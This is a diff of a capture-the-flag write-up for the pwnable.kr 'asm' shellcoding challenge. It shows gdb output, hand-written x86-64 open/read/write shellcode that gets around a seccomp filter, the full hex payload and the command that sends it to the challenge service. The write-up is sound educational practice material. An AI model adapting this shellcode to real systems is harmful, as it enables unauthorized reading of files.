@@ -85,7 +85,8 @@ int main(int argc, char* argv[]){
 
 As we expected, we need to create shellcode, but we can only use open,read,write,exit api due to seccomp.
 Obviously, this is enough for read a file.
-We need to read "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" file.
+We need to read 
+>"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" file.
 
 The file name is long, but it does not cause any problem because we can create the shellcode size up to 0x1000 which is very big.
 
@@ -95,68 +96,68 @@ There is an easy way to create shellcode. For example, pwntool can automatically
 For this challenge, I will use a harder way. I will manually write shellcode for fun.
 
 First of all, our shellcode is inserted after the below code,
-\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
+>\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
 
 What is this?
 The above code is just xoring registers.
 
-[----------------------------------registers-----------------------------------]
-RAX: 0x41414000 --> 0x3148db3148c03148
-RBX: 0x0
-RCX: 0x7ffff78c9400 (<closelog+48>:     sub    rsp,0x80)
-RDX: 0x555555757750 --> 0xd0
-RSI: 0x7ffff7b8cb38 --> 0x555555757000 --> 0x0
-RDI: 0xffffffff
-RBP: 0x7fffffffeb30 --> 0x555555554eb0 (<__libc_csu_init>:      push   r15)
-RSP: 0x7fffffffeb08 --> 0x555555554ea9 (<main+325>:     mov    eax,0x0)
-RIP: 0x41414000 --> 0x3148db3148c03148
-R8 : 0x555555757010 --> 0x555555757750 --> 0xd0
-R9 : 0x0
-R10: 0x2b ('+')
-R11: 0x7ffff7bb3c40 (<seccomp_release>: jmp    0x7ffff7bb8810)
-R12: 0x555555554b20 (<_start>:  xor    ebp,ebp)
-R13: 0x7fffffffec10 --> 0x1
-R14: 0x0
-R15: 0x0
-EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-=> 0x41414000:  xor    rax,rax
-   0x41414003:  xor    rbx,rbx
-   0x41414006:  xor    rcx,rcx
-   0x41414009:  xor    rdx,rdx
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffeb08 --> 0x555555554ea9 (<main+325>:    mov    eax,0x0)
-0008| 0x7fffffffeb10 --> 0x7fffffffec18 --> 0x7fffffffee28 ("/home/asm/asm")
-0016| 0x7fffffffeb18 --> 0x155554b20
-0024| 0x7fffffffeb20 --> 0x2effffec10
-0032| 0x7fffffffeb28 --> 0x41414000 --> 0x3148db3148c03148
-0040| 0x7fffffffeb30 --> 0x555555554eb0 (<__libc_csu_init>:     push   r15)
-0048| 0x7fffffffeb38 --> 0x7ffff77e8830 (<__libc_start_main+240>:       mov    edi,eax)
-0056| 0x7fffffffeb40 --> 0x0
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-0x0000000041414000 in ?? ()
-gdb-peda$ x/20i 0x41414000
-=> 0x41414000:  xor    rax,rax
-   0x41414003:  xor    rbx,rbx
-   0x41414006:  xor    rcx,rcx
-   0x41414009:  xor    rdx,rdx
-   0x4141400c:  xor    rsi,rsi
-   0x4141400f:  xor    rdi,rdi
-   0x41414012:  xor    rbp,rbp
-   0x41414015:  xor    r8,r8
-   0x41414018:  xor    r9,r9
-   0x4141401b:  xor    r10,r10
-   0x4141401e:  xor    r11,r11
-   0x41414021:  xor    r12,r12
-   0x41414024:  xor    r13,r13
-   0x41414027:  xor    r14,r14
-   0x4141402a:  xor    r15,r15
-   0x4141402d:  nop
-   0x4141402e:  mov    rax,0x2
-   0x41414035:  lea    rdi,[rip+0x32]        # 0x4141406e
-   0x4141403c:  mov    r10,rsp
-   0x4141403f:  syscall
+> [----------------------------------registers-----------------------------------]
+> RAX: 0x41414000 --> 0x3148db3148c03148
+> RBX: 0x0
+> RCX: 0x7ffff78c9400 (<closelog+48>:     sub    rsp,0x80)
+> RDX: 0x555555757750 --> 0xd0
+> RSI: 0x7ffff7b8cb38 --> 0x555555757000 --> 0x0
+> RDI: 0xffffffff
+> RBP: 0x7fffffffeb30 --> 0x555555554eb0 (<__libc_csu_init>:      push   r15)
+> RSP: 0x7fffffffeb08 --> 0x555555554ea9 (<main+325>:     mov    eax,0x0)
+> RIP: 0x41414000 --> 0x3148db3148c03148
+> R8 : 0x555555757010 --> 0x555555757750 --> 0xd0
+> R9 : 0x0
+> R10: 0x2b ('+')
+> R11: 0x7ffff7bb3c40 (<seccomp_release>: jmp    0x7ffff7bb8810)
+> R12: 0x555555554b20 (<_start>:  xor    ebp,ebp)
+> R13: 0x7fffffffec10 --> 0x1
+> R14: 0x0
+> R15: 0x0
+> EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+> [-------------------------------------code-------------------------------------]
+> => 0x41414000:  xor    rax,rax
+>    0x41414003:  xor    rbx,rbx
+>    0x41414006:  xor    rcx,rcx
+>    0x41414009:  xor    rdx,rdx
+> [------------------------------------stack-------------------------------------]
+> 0000| 0x7fffffffeb08 --> 0x555555554ea9 (<main+325>:    mov    eax,0x0)
+> 0008| 0x7fffffffeb10 --> 0x7fffffffec18 --> 0x7fffffffee28 ("/home/asm/asm")
+> 0016| 0x7fffffffeb18 --> 0x155554b20
+> 0024| 0x7fffffffeb20 --> 0x2effffec10
+> 0032| 0x7fffffffeb28 --> 0x41414000 --> 0x3148db3148c03148
+> 0040| 0x7fffffffeb30 --> 0x555555554eb0 (<__libc_csu_init>:     push   r15)
+> 0048| 0x7fffffffeb38 --> 0x7ffff77e8830 (<__libc_start_main+240>:       mov    edi,eax)
+> 0056| 0x7fffffffeb40 --> 0x0
+> [------------------------------------------------------------------------------]
+> Legend: code, data, rodata, value
+> 0x0000000041414000 in ?? ()
+> gdb-peda$ x/20i 0x41414000
+> => 0x41414000:  xor    rax,rax
+>    0x41414003:  xor    rbx,rbx
+>    0x41414006:  xor    rcx,rcx
+>    0x41414009:  xor    rdx,rdx
+>    0x4141400c:  xor    rsi,rsi
+>    0x4141400f:  xor    rdi,rdi
+>    0x41414012:  xor    rbp,rbp
+>    0x41414015:  xor    r8,r8
+>    0x41414018:  xor    r9,r9
+>    0x4141401b:  xor    r10,r10
+>    0x4141401e:  xor    r11,r11
+>    0x41414021:  xor    r12,r12
+>    0x41414024:  xor    r13,r13
+>    0x41414027:  xor    r14,r14
+>    0x4141402a:  xor    r15,r15
+>    0x4141402d:  nop
+>    0x4141402e:  mov    rax,0x2
+>    0x41414035:  lea    rdi,[rip+0x32]        # 0x4141406e
+>    0x4141403c:  mov    r10,rsp
+>    0x4141403f:  syscall
 
 
 So, my shellcode cannot rely on any pre-existed register values.
@@ -183,40 +184,40 @@ I used online assembler
 https://defuse.ca/online-x86-assembler.htm#disassembly
 
 The Shellcode!!!
-0:  48 c7 c0 02 00 00 00    mov    rax,0x2
-7:  48 8d 3d 33 00 00 00    lea    rdi,[rip+0x33]        # 41 <_main+0x41>
-e:  49 89 e2                mov    r10,rsp
-11: 0f 05                   syscall
-13: 48 89 c7                mov    rdi,rax
-16: 48 31 c0                xor    rax,rax
-19: 48 c7 c2 00 10 00 00    mov    rdx,0x1000
-20: 4c 89 d6                mov    rsi,r10
-23: 0f 05                   syscall
-25: 48 c7 c0 01 00 00 00    mov    rax,0x1
-2c: 48 c7 c7 01 00 00 00    mov    rdi,0x1
-33: 0f 05                   syscall
-35: 48 c7 c0 3c 00 00 00    mov    rax,0x3c
-3c: 48 31 ff                xor    rdi,rdi
-3f: 0f 05                   syscall
+> 0:  48 c7 c0 02 00 00 00    mov    rax,0x2
+> 7:  48 8d 3d 33 00 00 00    lea    rdi,[rip+0x33]        # 41 <_main+0x41>
+> e:  49 89 e2                mov    r10,rsp
+> 11: 0f 05                   syscall
+> 13: 48 89 c7                mov    rdi,rax
+> 16: 48 31 c0                xor    rax,rax
+> 19: 48 c7 c2 00 10 00 00    mov    rdx,0x1000
+> 20: 4c 89 d6                mov    rsi,r10
+> 23: 0f 05                   syscall
+> 25: 48 c7 c0 01 00 00 00    mov    rax,0x1
+> 2c: 48 c7 c7 01 00 00 00    mov    rdi,0x1
+> 33: 0f 05                   syscall
+> 35: 48 c7 c0 3c 00 00 00    mov    rax,0x3c
+>  3c: 48 31 ff                xor    rdi,rdi
+> 3f: 0f 05                   syscall
 
 this is this.
-48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f686969
+> 48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f686969
 
 the file name is
-[hex(ord(c)) for c in "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"]
+> [hex(ord(c)) for c in "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"]
 
-['0x74', '0x68', '0x69', '0x73', '0x5f', '0x69', '0x73', '0x5f', '0x70', '0x77', '0x6e', '0x61', '0x62', '0x6c', '0x65', '0x2e', '0x6b', '0x72', '0x5f', '0x66', '0x6c', '0x61', '0x67', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x70', '0x6c', '0x65', '0x61', '0x73', '0x65', '0x5f', '0x72', '0x65', '0x61', '0x64', '0x5f', '0x74', '0x68', '0x69', '0x73', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x2e', '0x73', '0x6f', '0x72', '0x72', '0x79', '0x5f', '0x74', '0x68', '0x65', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x6e', '0x61', '0x6d', '0x65', '0x5f', '0x69', '0x73', '0x5f', '0x76', '0x65', '0x72', '0x79', '0x5f', '0x6c', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x6e', '0x67']
+> ['0x74', '0x68', '0x69', '0x73', '0x5f', '0x69', '0x73', '0x5f', '0x70', '0x77', '0x6e', '0x61', '0x62', '0x6c', '0x65', '0x2e', '0x6b', '0x72', '0x5f', '0x66', '0x6c', '0x61', '0x67', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x70', '0x6c', '0x65', '0x61', '0x73', '0x65', '0x5f', '0x72', '0x65', '0x61', '0x64', '0x5f', '0x74', '0x68', '0x69', '0x73', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x2e', '0x73', '0x6f', '0x72', '0x72', '0x79', '0x5f', '0x74', '0x68', '0x65', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x6e', '0x61', '0x6d', '0x65', '0x5f', '0x69', '0x73', '0x5f', '0x76', '0x65', '0x72', '0x79', '0x5f', '0x6c', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x6e', '0x67']
 
 This is my final shellcode,
 
-48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700
+> 48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700
 
 don't forget to insert 0x00 at the end of the file name.
 and need to add file path ./ at the beginning of the file name.
 By the way, the buffer for read and write syscall, I used RSP to reference suitable stack region.
 
 All ready, let's send the payload to get the flag!
-python -c 'print "48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700".decode("hex")' > hsj3
+> python -c 'print "48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700".decode("hex")' > hsj3
 
 asm@ubuntu:~$ cat /tmp/sj/hsj3 | nc 0 9026
 Welcome to shellcoding practice challenge.
